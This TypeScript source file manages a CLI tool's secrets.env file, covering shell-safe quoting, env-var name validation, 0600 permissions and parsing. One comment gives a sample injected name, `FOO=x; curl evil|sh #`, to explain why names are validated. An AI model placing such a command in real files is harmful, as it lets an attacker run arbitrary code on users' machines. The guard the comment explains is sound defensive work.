// Shared writer for ~/.gini/secrets.env.
//
// Two call sites historically reimplemented the same logic with subtle
// drift:
//   - src/cli/commands/setup.ts (writeKeyToSecretsFile) — the original
//     CLI-side helper used by `gini setup`, `gini provider set`, etc.
//   - src/runtime/setup-api.ts — the browser /setup endpoint POST that
//     persists the key the user typed into the form.
//
// Both must produce a shell-sourceable file (the installed `gini` wrapper
// does `set -a; . ~/.gini/secrets.env; set +a`), and both must end up at
// mode 0600 even if a previous version of the file existed at 0644.
//
// Lives under src/state/ because secrets.env is local persistent state —
// not provider behavior, not a CLI concern. Both runtime and CLI are
// allowed to import from src/state/.

import { chmodSync, existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { dirname, join } from "node:path";

// Resolve via process.env.HOME first so test seams that override the env
// var see the override. os.homedir() caches the platform's getpwuid
// result on macOS and won't pick up a runtime HOME change.
export function secretsEnvPath(): string {
  const home = process.env.HOME || homedir();
  return join(home, ".gini", "secrets.env");
}

// POSIX-safe single-quote escaping. Closes the literal string, inserts an
// escaped quote, reopens. The single-quoted shell form is fully literal —
// `$`, backticks, and backslashes pass through unchanged. The result of
// `parseSecretsEnv` (in src/cli/autostart.ts) inverts this exact form.
function shellSingleQuote(value: string): string {
  return "'" + value.replace(/'/g, "'\\''") + "'";
}

// An env-var NAME is interpolated raw into the shell-sourced secrets.env line
// AND into the match RegExps below, so it MUST be a strict identifier. A name
// like `FOO=x; curl evil|sh #` or one bearing a newline would otherwise smuggle
// arbitrary shell into a file the `gini` wrapper sources on every launch (RCE
// persistence), and an unconstrained name is also a RegExp-injection / ReDoS
// vector. Unlike the value (which `shellSingleQuote` neutralizes), the name has
// no safe-quoting form in `export NAME=…`, so reject anything non-conforming.
// This guard matters now that a user-configurable apiKeyEnv (a custom
// ANTHROPIC/AZURE_OPENAI_API_KEY env name, etc.) can reach here.
const SAFE_ENV_VAR_NAME = /^[A-Za-z_][A-Za-z0-9_]*$/;
export function isSafeEnvVarName(name: string): boolean {
  return SAFE_ENV_VAR_NAME.test(name);
}
// Alias under the name the Azure-provider path on main imports.
export const isValidEnvVarName = isSafeEnvVarName;
function assertSafeEnvVarName(name: string): void {
  if (!SAFE_ENV_VAR_NAME.test(name)) {
    throw new Error(`Refusing to use unsafe env var name '${name}'; must match /^[A-Za-z_][A-Za-z0-9_]*$/.`);
  }
}


// Write a `KEY=value` (or replace an existing one) into ~/.gini/secrets.env
// in a shell-sourceable form. Always lands at mode 0600 — even when the
// file pre-existed at a more permissive mode.
//
// Idempotency: matches `export NAME=...` and bare `NAME=...` forms (set -a
// exports either, so accepting both keeps us compatible with hand-edited
// files).
//
// `writeFileSync`'s `mode` option only applies on file CREATION. If the
// file pre-existed with 0644 (e.g. a user hand-edited it), the write
// keeps that permission. Explicit chmod after the write ensures 0600 on
// every call so secrets aren't world-readable.
export function writeKeyToSecretsEnv(name: string, value: string): void {
  assertSafeEnvVarName(name);
  const path = secretsEnvPath();
  // mkdir if missing — secrets.env may be the first file we ever write
  // here on a fresh install.
  mkdirSync(dirname(path), { recursive: true });
  let existing = existsSync(path) ? readFileSync(path, "utf8") : "";
  const line = `export ${name}=${shellSingleQuote(value)}`;
  const pattern = new RegExp(`^\\s*(?:export\\s+)?${name}=.*$`, "m");
  if (pattern.test(existing)) {
    existing = existing.replace(pattern, line);
  } else {
    if (existing && !existing.endsWith("\n")) existing += "\n";
    existing += line + "\n";
  }
  writeFileSync(path, existing, { mode: 0o600 });
  try { chmodSync(path, 0o600); } catch { /* best-effort tightening */ }
}

// Drop a `KEY=...` line from ~/.gini/secrets.env, matching both the
// `export KEY=...` and bare `KEY=...` forms the writer emits. No-op
// when the file is absent or doesn't contain the name. Returns true
// when a line was actually removed so callers can decide whether to
// log / nudge a plist refresh. Mode stays 0600 via the same chmod the
// writer enforces.
export function removeKeyFromSecretsEnv(name: string): boolean {
  // An unsafe name can never have been written (writeKeyToSecretsEnv rejects
  // it), so there's nothing to remove — and skipping avoids RegExp injection.
  if (!isSafeEnvVarName(name)) return false;
  const path = secretsEnvPath();
  if (!existsSync(path)) return false;
  const existing = readFileSync(path, "utf8");
  const pattern = new RegExp(`^\\s*(?:export\\s+)?${name}=.*\\r?\\n?`, "m");
  if (!pattern.test(existing)) return false;
  const next = existing.replace(pattern, "");
  writeFileSync(path, next, { mode: 0o600 });
  try { chmodSync(path, 0o600); } catch { /* best-effort */ }
  return true;
}

// Best-effort permission-tightening for the existing file. No-op when the
// file doesn't exist. Kept as a separate helper so callers that just want
// to enforce mode 0600 (e.g. before reading secrets) don't have to write
// a new key.
export function ensureSecretsEnvPerms(): void {
  const path = secretsEnvPath();
  if (!existsSync(path)) return;
  try { chmodSync(path, 0o600); } catch { /* best-effort */ }
}

// Undo the single-quote escaping written by writeKeyToSecretsEnv. Inverse
// of the POSIX ANSI-C quoting the writer uses; also accepts double-quoted
// values for compatibility with hand-edited files. Exported so the CLI's
// readback (`gini setup` / `gini provider set`) and the autostart plist
// installer share one implementation instead of three subtly different
// ones.
export function unquoteSecretsValue(raw: string): string {
  const trimmed = raw.trim();
  if (trimmed.length === 0) return "";
  if (trimmed.startsWith("'") && trimmed.endsWith("'") && trimmed.length >= 2) {
    return trimmed.slice(1, -1).replace(/'\\''/g, "'");
  }
  if (trimmed.startsWith('"') && trimmed.endsWith('"') && trimmed.length >= 2) {
    return trimmed.slice(1, -1).replace(/\\(["\\$`])/g, "$1");
  }
  return trimmed;
}

// Best-effort read of the raw ~/.gini/secrets.env body for literal-redaction
// inputs (the same `secretsEnvBody` redactReportText consumes). Returns
// undefined when the file is absent or unreadable — pattern-based redaction
// still runs regardless, so a read failure must never throw on the redaction
// path.
export function readSecretsEnvBody(): string | undefined {
  const path = secretsEnvPath();
  try {
    if (!existsSync(path)) return undefined;
    return readFileSync(path, "utf8");
  } catch {
    return undefined;
  }
}

// Parse a shell-format `KEY=VALUE` file (the same shape writeKeyToSecretsEnv
// produces). Supports `export KEY=value`, bare `KEY=value`, single-quoted,
// double-quoted, and unquoted values. Comments and blank lines are skipped.
// Values are returned in their final unescaped form (via unquoteSecretsValue),
// ready to drop into launchd's EnvironmentVariables or process.env.
export function parseSecretsEnv(body: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const rawLine of body.split(/\r?\n/)) {
    const line = rawLine.trim();
    if (!line || line.startsWith("#")) continue;
    const match = line.match(/^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=(.*)$/);
    if (!match) continue;
    const key = match[1]!;
    out[key] = unquoteSecretsValue(match[2] ?? "");
  }
  return out;
}

// Load ~/.gini/secrets.env into this process's own env so env-keyed provider
// credentials (notably bedrock's AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY) are
// present under EVERY launch path — including tmux `bun run gini run`, which
// bypasses both the installed `gini` wrapper's `set -a; . secrets.env` and the
// launchd plist's baked-in EnvironmentVariables.
//
// Fill-missing: a key is only set when process.env[KEY] is undefined or empty,
// so an ambiently-exported value (e.g. a user who exports AWS_* incl.
// AWS_SESSION_TOKEN themselves) always wins. Best-effort — never throws; an
// absent or unreadable file yields []. Returns the keys it actually set.
export function loadSecretsEnvIntoProcess(): string[] {
  const body = readSecretsEnvBody();
  if (body === undefined) return [];
  const set: string[] = [];
  for (const [key, value] of Object.entries(parseSecretsEnv(body))) {
    const current = process.env[key];
    if (current === undefined || current === "") {
      process.env[key] = value;
      set.push(key);
    }
  }
  return set;
}

// Predicate: does ~/.gini/secrets.env already carry a NON-EMPTY value
// for this env-var name? Used by callers that want to avoid silently
// clobbering an existing key — `gini import apply openclaw` notably
// wants to skip a provider key the operator has already configured,
// unless --force is set, since the openclaw value may be stale or
// wrong.
//
// "Has key" means there is a `KEY=value` line AND the value (after
// unquoting) is non-empty. An entry like `OPENAI_API_KEY=""` is
// treated as MISSING — the operator either set up a placeholder
// before configuring or hand-cleared a stale value, and the migrator
// should fill it instead of treating the placeholder as a real key.
// This matches `hasKeyInSecretsFile` in `src/cli/commands/setup.ts`,
// so `gini setup` and `gini import apply openclaw` agree on what
// counts as "the operator has configured this key."
export function secretsEnvHasKey(name: string): boolean {
  if (!isSafeEnvVarName(name)) return false;
  const path = secretsEnvPath();
  if (!existsSync(path)) return false;
  const contents = readFileSync(path, "utf8");
  const match = new RegExp(`^\\s*(?:export\\s+)?${name}=(.*)$`, "m").exec(contents);
  if (!match) return false;
  return unquoteSecretsValue(match[1] ?? "").length > 0;
}
